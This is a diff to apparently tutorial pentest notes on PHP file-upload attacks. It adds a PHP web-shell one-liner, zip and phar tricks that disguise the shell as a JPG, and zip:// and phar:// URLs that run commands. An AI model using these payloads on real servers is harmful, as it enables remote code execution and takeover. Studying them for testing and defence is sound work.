@@ -182,3 +182,32 @@ Example using a GIF image (*A GIF's magic bytes are in ASCII so easy to forge*):
 ```bash
 echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
 ```
+Once it has been uploaded we just need to work out the place it was put (*eg. we could see the path of the image via the user profile picture element*)
+
+This can also be done if the PHP [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper is enabled (*disabled by default*) as we can upload a zip file and then use the wrapper to execute it.
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+```
+> Creates an archive called `shell.jpg`, we don't have to have it end with `.zip` but it does mean that we can still be blocked from uploading if they have content-type checks.
+
+Once uploaded we can then use the wrapper:
+```
+zip://shell.jpg#shell.php&cmd=id
+```
+
+We can do a similar thing with the **phar** wrapper.
+```php
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$phar->stopBuffering();
+```
+```bash
+php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+```
+```
+phar://shell.jpg/shell.txt&s
+```
